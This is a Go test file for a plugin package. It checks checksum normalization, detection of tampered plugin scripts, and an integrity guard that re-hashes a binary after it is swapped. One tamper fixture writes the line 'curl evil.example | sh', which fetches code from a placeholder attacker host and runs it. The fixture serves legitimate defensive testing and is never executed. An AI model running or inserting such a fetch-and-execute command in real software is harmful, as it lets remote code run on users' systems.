package plugin

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeExec(t *testing.T, dir, name, body string) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestNormalizeChecksum(t *testing.T) {
	hex64 := strings.Repeat("ab", 32)

	// Unpinned forms.
	for _, in := range []string{"", "   "} {
		got, pinned, err := normalizeChecksum(in)
		if err != nil || pinned || got != "" {
			t.Errorf("%q should be unpinned, got (%q,%v,%v)", in, got, pinned, err)
		}
	}

	// Accepted forms — normalization must trim/lowercase BEFORE stripping the
	// prefix, so uppercase and padded variants work (the bug in the first rework).
	for _, in := range []string{hex64, "sha256:" + hex64, "SHA256:" + strings.ToUpper(hex64), "  sha256:" + hex64 + "  "} {
		got, pinned, err := normalizeChecksum(in)
		if err != nil || !pinned || got != hex64 {
			t.Errorf("%q should normalize to %q, got (%q,%v,%v)", in, hex64, got, pinned, err)
		}
	}

	// Malformed non-blank values must ERROR, not silently mean "unpinned".
	for _, in := range []string{"sha256:", "deadbeef", "sha256:zz" + strings.Repeat("a", 62)} {
		if _, pinned, err := normalizeChecksum(in); err == nil || pinned {
			t.Errorf("%q should be rejected as malformed, got pinned=%v err=%v", in, pinned, err)
		}
	}
}

func TestVerifyChecksum_DetectsTampering(t *testing.T) {
	dir := t.TempDir()
	bin := writeExec(t, dir, "plugin.sh", "#!/bin/sh\nexit 0\n")
	sum, err := fileSHA256(bin)
	if err != nil {
		t.Fatal(err)
	}
	if err := verifyChecksum(bin, ""); err != nil {
		t.Errorf("unpinned should pass: %v", err)
	}
	if err := verifyChecksum(bin, "sha256:"+strings.ToUpper(sum)); err != nil {
		t.Errorf("uppercase prefixed digest should pass: %v", err)
	}
	writeExec(t, dir, "plugin.sh", "#!/bin/sh\ncurl evil.example | sh\n")
	err = verifyChecksum(bin, sum)
	if err == nil || !strings.Contains(err.Error(), "integrity check") {
		t.Fatalf("expected tampering to be detected, got %v", err)
	}
}

// The guard must re-verify after the binary changes, not trust the boot-time
// result — that was the "boot-only verification" finding.
func TestIntegrityGuard_ReverifiesAfterSwap(t *testing.T) {
	dir := t.TempDir()
	bin := writeExec(t, dir, "p.sh", "#!/bin/sh\nexit 0\n")
	sum, err := fileSHA256(bin)
	if err != nil {
		t.Fatal(err)
	}
	var g integrityGuard
	if err := g.check(bin, sum); err != nil {
		t.Fatalf("first check should pass: %v", err)
	}
	if err := g.check(bin, sum); err != nil {
		t.Fatalf("repeat check on unchanged file should pass: %v", err)
	}
	// Swap the binary: size and mtime change, so the guard must re-hash and fail.
	writeExec(t, dir, "p.sh", "#!/bin/sh\necho pwned; exit 0\n")
	if err := g.check(bin, sum); err == nil {
		t.Fatal("guard must detect a binary swapped after the first verification")
	}
}
